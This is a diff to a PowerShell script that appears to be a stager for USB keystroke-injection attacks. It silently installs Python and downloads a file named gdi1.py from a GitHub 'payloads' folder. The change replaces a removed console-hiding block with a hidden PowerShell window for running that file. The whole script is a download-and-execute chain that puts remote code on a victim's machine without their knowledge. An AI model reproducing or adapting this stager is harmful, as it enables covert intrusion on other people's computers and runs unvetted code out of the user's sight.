@@ -1,18 +1,3 @@
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
-
-$console = [Console.Window]::GetConsoleWindow()
-
-# 0 hide
-[Console.Window]::ShowWindow($console, 0) | Out-Null
-
-
-
 $python = Get-Command python -ErrorAction SilentlyContinue
 if (-not $python) {
     winget install Python.Python.3 --accept-source-agreements --accept-package-agreements
@@ -35,5 +20,5 @@ else {
 }
 
 curl.exe https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/gdi1.py --output (Join-Path $env:USERPROFILE 'gdi1.py')
-pyw (Join-Path $env:USERPROFILE 'gdi1.py')
+powershell.exe -WindowStyle Hidden -Command (pyw (Join-Path $env:USERPROFILE 'gdi1.py'))
 exit
